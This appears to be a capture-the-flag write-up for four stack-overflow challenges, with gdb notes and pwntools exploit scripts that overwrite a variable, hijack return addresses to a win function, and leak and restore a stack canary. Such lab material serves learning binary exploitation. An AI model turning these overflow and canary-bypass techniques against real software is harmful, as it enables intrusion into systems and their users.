Best security
===========================

General overview of problems faced
Best security:
Need to over flow the buf and write to var_11 as "12345678"

in hex it is:

31 32 33 34 35 36 37 38

In big endian it is
0x3132333435363738

Little endian it is:

buff size = 0x87

var11 is at 0x7ffd533b0e27.
rbp = 0x7ffd533b0e30
rbp = 0x7ffd533b0da0

commands:
x/20xg $rsp

set disassembly-flavor intel

-------------------------------------

Script/Command used
------------------

```
from pwn import *


PROGRAM_PATH = (Path(__file__).parent / "bestsecurity").resolve().__str__()
BUFF_SIZE = 0x87
# BUFF_SIZE = 0x88
# CANARY = 123456789
CANARY = "3132333435363738"

gdb_script = """
b *main
b *check_canary
b *check_canary+69
b *check_canary+39

c
"""


# FullPath
print(f"Program path is: {PROGRAM_PATH}")
print("____________________________________")


# TODO: Add the ip address here later!
def start(argv=[], *a, **kwargs):
    if args.GDB:
        return gdb.debug([PROGRAM_PATH] + argv, gdbscript=gdb_script, *a, **kwargs)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kwargs)
    else:
        return process([PROGRAM_PATH] + argv, *a, **kwargs)


io = start()
res = io.recvlines(1)
print("____________________________________")
print(res)

le = p64(int(CANARY, 16))
be = p64(int(CANARY, 16), endianness="big")
payload = b"A" * BUFF_SIZE + be
print(f"Sending payload: {payload}")

io.sendline(payload)
res = io.recvlines(1)
print(res)
io.interactive()
```

Blind
===========================

this is the ret addr to:
0x0000000000401215
x/10xg $rbp
We just need to replace the return address with the function call

-------------------------------------

Script/Command used
------------------

```
from pwn import *


PROGRAM_PATH = (Path(__file__).parent / "blind").resolve().__str__()
BUFF_SIZE = 0x40 + 8
# now ADD eight bytes for the return address

# BUFF_SIZE = 0x88
# CANARY = 123456789
win_addr = 0x401196

gdb_script = """
b *main
b *vuln+42
b *vuln+54
c
"""


# FullPath
print(f"Program path is: {PROGRAM_PATH}")
print("____________________________________")


# TODO: Add the ip address here later!
def start(argv=[], *a, **kwargs):
    if args.GDB:
        return gdb.debug([PROGRAM_PATH] + argv, gdbscript=gdb_script, *a, **kwargs)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kwargs)
    else:
        return process([PROGRAM_PATH] + argv, *a, **kwargs)


io = start()
res = io.recvlines(1)
print("____________________________________")
print(res)

le = p64(win_addr)
be = p64(win_addr, endianness="big")
payload = b"A" * BUFF_SIZE + le
print(f"Sending payload: {payload}")

io.sendline(payload)
io.interactive()

```

Jump
===========================

this is the ret addr to:
0x00000000004012ce
x/10xg $rbp

Need to overwrite the return address and restire the stack canary

Script/Command used
------------------

```
from pwn import *
import re

PROGRAM_PATH = (Path(__file__).parent / "jump").resolve().__str__()
BUFF_SIZE = 0x40 + 8
# now ADD eight bytes for the return address

# BUFF_SIZE = 0x88
# CANARY = 123456789
# win_addr = 0x401196

gdb_script = """
b *main
b *vuln+42
b *vuln+54
c
"""


# FullPath
print(f"Program path is: {PROGRAM_PATH}")
print("____________________________________")


# TODO: Add the ip address here later!
def start(argv=[], *a, **kwargs):
    if args.GDB:
        return gdb.debug([PROGRAM_PATH] + argv, gdbscript=gdb_script, *a, **kwargs)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kwargs)
    else:
        return process([PROGRAM_PATH] + argv, *a, **kwargs)


io = start()
res = io.recvlinesS(1)
print("____________________________________")
print(res)
matched = re.search(r"0x[0-9A-Fa-f]+", res[0])
win_addr = matched.group(0)


res = io.recvlines(1)
print("____________________________________")
print(res)

le = p64(int(win_addr, 16))
be = p64(int(win_addr, 16), endianness="big")
payload = b"A" * BUFF_SIZE + le
print(f"Sending payload: {payload}")
io.sendline(payload)

res = io.recvlines(1)
print("____________________________________")
print(res)


io.interactive()

```

# stack-dump

p prints the address at 0x0000 7fff ffff d888

0x00007fffffffd890

The win function is at:
0x00000000004012f6    36 FUNC    GLOBAL DEFAULT   15 win

000000000040148f                        fread(&buffer_64bit, 1, (int64_t)atoi(&buffer_64bit), stdin);
This puts the size of len = atoi(&buffer_64bit) into the buffer_64bit[48]

00000000004012f6    36 FUNC    GLOBAL DEFAULT   15 win
stack frame size is 0x7fffffffd930 - 0x7fffffffd8d0 = 96 bytes

The canary is at: rbp - 0x18
qword [rbp-0x18 {var_20}]   , rax
buffer is at  =>   sub    rsp, 0x58
offset from leaked address to stack canary is:
(0x7fffffffd918 - 0x7fffffffd8d7) = 65 bytes
(canary) - leaked_addr

(gdb) x/2gx $rbp
0x7fff5b781290: 0x00007fff5b7812b0      0x0000000000401598
(gdb) x/14gx $rsp

The input case  used to add the address of the canary and leak it!

Then the dump case used to leak the canary

then read the contents of the canary

and create payload

padding + le_can + padding_to_ret_addr + win_addr
56 + canary + 24 + 8

Script/Command used
------------------

```
from pwn import *
import re

PROGRAM_PATH = (Path(__file__).parent / "stack-dump").resolve().__str__()
FRAME_SIZE = 0x58
BUFF_SIZE = 56
STACK_TO_RBP = 24
# now ADD eight bytes for the return address
OFFSET_TO_CANARY = 65  # 0x41
win_addr = p64(0x4012F6, "little")


gdb_script = """
b *main
b *loop+70
b *loop+281
c
"""


# FullPath
print(f"Program path is: {PROGRAM_PATH}")
print("____________________________________")


# TODO: Add the ip address here later!
def start(argv=[], *a, **kwargs):
    if args.GDB:
        return gdb.debug([PROGRAM_PATH] + argv, gdbscript=gdb_script, *a, **kwargs)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kwargs)
    else:
        return process([PROGRAM_PATH] + argv, *a, **kwargs)


io = start()
res = io.recvlinesS(1)
print("____________________________________")
print(res)
print("____________________________________")
res = io.recvlinesS(1)
matched = re.search(r"0x[0-9A-Fa-f]+", res[0])
leaked_addr = matched.group(0)
leaked_addr_int = int(leaked_addr, base=16)
print(f"Received address: {leaked_addr}")

canary_address = leaked_addr_int + OFFSET_TO_CANARY
print(f"Canary address calculated at:  {hex(canary_address)}")
print("____________________________________")

io.sendline(b"i")
io.sendline(p64(canary_address) + b"\n")
io.sendline(b"D")
io.recvuntil(b"memory at " + hex(canary_address).encode("ascii") + b": ")


canary = io.recv(8)
print(f"We got the canary: 0x{canary.hex()}")
print(f"We got the canary: 0x{canary}")

le_can = p64(u64(canary), "little")
be_can = p64(u64(canary), "big")
print("____________________________________")
# Create the payload
#
padding = b"B" * BUFF_SIZE
padding_to_ret_addr = STACK_TO_RBP * b"B"
payload: bytes = padding + le_can + padding_to_ret_addr + win_addr
print(f"The payload is {payload.hex()}")
print(f"Now send the payload!!")


# Now send the payload
io.sendline(b"i")
io.sendline(payload + b"\n")
# We need this newline
io.sendline(b"\n")

io.sendline(b"q")


io.interactive()

```
